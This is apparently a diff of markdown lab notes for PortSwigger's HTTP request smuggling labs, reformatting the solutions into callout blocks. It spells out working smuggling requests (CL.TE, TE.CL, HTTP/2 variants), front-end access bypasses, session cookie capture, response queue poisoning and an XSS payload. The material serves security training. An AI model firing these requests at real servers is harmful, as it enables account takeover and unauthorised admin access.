@@ -19,15 +19,11 @@
 # HTTP request smuggling, basic CL.TE vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
 
-<!-- omit in toc -->
-## Quick Solution
-As said in the title this website is vulnerable to a simple CL.TE vulnerability. Payload in the next paragraph.
-
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 Using Burp Repeater, issue the following request twice:
 
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Connection: keep-alive
@@ -38,23 +34,20 @@ Transfer-Encoding: chunked
 0
 
 G
-```
+~~~
 The second response should say: ``Unrecognized method GPOST``.
 
+```
 
 # HTTP request smuggling, basic TE.CL vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
 
-<!-- omit in toc -->
-## Quick Solution
-As said in the title this website is vulnerable to a simple TE.CL vulnerability. Payload in the next paragraph.
-
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
 
 Using Burp Repeater, issue the following request twice:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -70,22 +63,20 @@ x=1
 0
 
 
-```
+~~~
 The second response should say: ``Unrecognized method GPOST``.
+```
+
 
 # HTTP request smuggling, obfuscating the TE header
 Reference: https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
 
-<!-- omit in toc -->
-## Quick Solution
-In this case the TE header had to be obfuscated. Payload in the next paragraph.
-
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
 
 Using Burp Repeater, issue the following request twice:
-```http
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -102,20 +93,18 @@ x=1
 0
 
 
-```
+~~~
 The second response should say: ``Unrecognized method GPOST``. 
+```
+
 
 # HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
 Reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
 
-<!-- omit in toc -->
-## Quick Solution
-In this case the CL.TE vulnerability must be exploited via differential response. Payload in the next paragraph.
-
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 Using Burp Repeater, issue the following request twice:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -126,20 +115,17 @@ Transfer-Encoding: chunked
 
 GET /404 HTTP/1.1
 X-Ignore: X
-```
+~~~
 The second request should receive an HTTP 404 response.
+```
 
 # HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
 Reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
 
-<!-- omit in toc -->
-## Quick Solution
-In this case the TE.CL vulnerability must be exploited via differential response. Payload in the next paragraph.
-
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 Using Burp Repeater, issue the following request twice:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -155,21 +141,21 @@ x=1
 0
 
 
-```
+~~~
 The second request should receive an HTTP 404 response.
+```
 
 # Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
 
-<!-- omit in toc -->
-## Quick Solution
+## Hint
 This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.
 
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 1. Try to visit ``/admin`` and observe that the request is blocked.
 2. Using Burp Repeater, issue the following request twice:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -180,10 +166,10 @@ Transfer-Encoding: chunked
 
 GET /admin HTTP/1.1
 X-Ignore: X
-```
+~~~
 3. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
 4. Issue the following request twice:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -195,10 +181,10 @@ Transfer-Encoding: chunked
 GET /admin HTTP/1.1
 Host: localhost
 X-Ignore: X
-```
+~~~
 5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
 6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -213,10 +199,10 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
 
 x=
-```
+~~~
 7. Observe that you can now access the admin panel.
 8. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -231,21 +217,21 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
 
 x=
+~~~
 ```
 
 # Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
 
-<!-- omit in toc -->
-## Quick Solution
+## Hint
 This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.
 
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 1. Try to visit ``/admin`` and observe that the request is blocked.
 2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
 3. Using Burp Repeater, issue the following request twice:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-length: 4
@@ -260,10 +246,10 @@ x=1
 0
 
 
-```
+~~~
 4. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
 5. Issue the following request twice:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -280,10 +266,10 @@ x=1
 0
 
 
-```
+~~~
 6. Observe that you can now access the admin panel.
 7. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-length: 4
@@ -299,17 +285,18 @@ x=1
 0
 
 
+~~~
 ```
 
 # Exploiting HTTP request smuggling to reveal front-end request rewriting
 Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
 
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 1. Browse to ``/admin`` and observe that the admin panel can only be loaded from ``127.0.0.1``.
 2. Use the site's search function and observe that it reflects the value of the ``search`` parameter.
 3. Use Burp Repeater to issue the following request twice.
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -324,10 +311,10 @@ Content-Length: 200
 Connection: close
 
 search=test
-```
+~~~
 4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
 5. Make a note of the name of the`` X-*-IP`` header in the rewritten request, and use it to access the admin panel:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -343,9 +330,9 @@ Content-Length: 10
 Connection: close
 
 x=1
-```
+~~~
 6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -361,17 +348,18 @@ Content-Length: 10
 Connection: close
 
 x=1
+~~~
 ```
 
 # Exploiting HTTP request smuggling to capture other users' requests
 Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
 
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 1. Visit a blog post and post a comment.
 3. Send the ``comment-post`` request to Burp Repeater, shuffle the body parameters so the ``comment`` parameter occurs last, and make sure it still works.
 Increase the ``comment-post`` request's ``Content-Length`` to 400, then smuggle it to the back-end server:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -386,23 +374,24 @@ Content-Length: 400
 Cookie: session=your-session-token
 
 csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
-```
+~~~
 4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
 5. Copy the user's Cookie header from the comment, and use it to access their account.
+```
 
 # Exploiting HTTP request smuggling to deliver reflected XSS
 Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
 
-<!-- omit in toc -->
-## Solution
+```ad-done
+title: Solution
 1. Visit a blog post, and send the request to Burp Repeater.
 2. Observe that the comment form contains your ``User-Agent`` header in a hidden input.
 3. Inject an XSS payload into the ``User-Agent`` header and observe that it gets reflected:
-```
+~~~html
 "/><script>alert(1)</script>
-```
+~~~
 4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
-```
+~~~http
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -417,6 +406,7 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 5
 
 x=1
+~~~
 ```
 
 # Response queue poisoning via H2.TE request smuggling
@@ -425,14 +415,14 @@ Reference: https://portswigger.net/web-security/request-smuggling/advanced/respo
 ```ad-success
 title: Solution
 1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2 before sending the request.
-    ~~~
+    ~~~http
     POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Transfer-Encoding: chunked 0 SMUGGLED
     ~~~
 1. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
     
 3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.
     
-    ~~~
+    ~~~http
     POST /x HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Transfer-Encoding: chunked 0 GET /x HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net
     ~~~
     
@@ -446,7 +436,7 @@ title: Solution
     
 6. Copy the session cookie and use it to send the following request:
     
-    ~~~
+    ~~~http
     GET /admin HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=STOLEN-SESSION-COOKIE
     ~~~
 1. Send the request repeatedly until you receive a 200 response containing the admin panel.
@@ -461,7 +451,7 @@ Reference: https://portswigger.net/web-security/request-smuggling/advanced/lab-r
 title: Solution
 1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a `Content-Length: 0` header as follows. Remember to expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2 before sending the request.
     
-    ~~~
+    ~~~http
     POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0 SMUGGLED
     ~~~
 1. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
@@ -470,7 +460,7 @@ title: Solution
     
 4. Create the following request to smuggle the start of a request for `/resources`, along with an arbitrary `Host` header:
     
-    ~~~
+    ~~~http
     POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0 GET /resources HTTP/1.1 Host: foo Content-Length: 5 x=1
     ~~~
 1. Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.
@@ -479,7 +469,7 @@ title: Solution
     
 7. In Burp Repeater, edit your malicious request so that the `Host` header points to your exploit server:
     
-    ~~~
+    ~~~http
     POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0 GET /resources HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net Content-Length: 5 x=1
     ~~~
 1. Send the request a few times and confirm that you receive a redirect to the exploit server.
@@ -522,7 +512,7 @@ title: Solution
     
 5. Change the body of the request to the following:
     
-    ~~~
+    ~~~http
     0 POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Content-Length: 800 search=x
     ~~~
 1. Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive:
@@ -568,7 +558,7 @@ title: Solution
     
 6. Copy the session cookie and use it to send the following request:
     
-    ~~~
+    ~~~http
     GET /admin HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=STOLEN-SESSION-COOKIE
     ~~~
 1. Send the request repeatedly until you receive a 200 response containing the admin panel.
@@ -589,7 +579,7 @@ title: Solution
     
 4. In the body, add an arbitrary request smuggling prefix. The result should look something like this:
     
-    ~~~
+    ~~~http
     POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: CORRECT GET /hopefully404 HTTP/1.1 Foo: x
     ~~~
 1. Change the path of the main `POST` request to point to an arbitrary endpoint that you want to test.
@@ -615,7 +605,7 @@ title: Solution
     
 3. Smuggle a request to `GET /admin/delete?username=carlos` request to solve the lab.
     
-    ~~~
+    ~~~http
     POST /resources/images/blog.svg HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Length: CORRECT GET /admin/delete?username=carlos HTTP/1.1 Foo: x
     ~~~
 ```
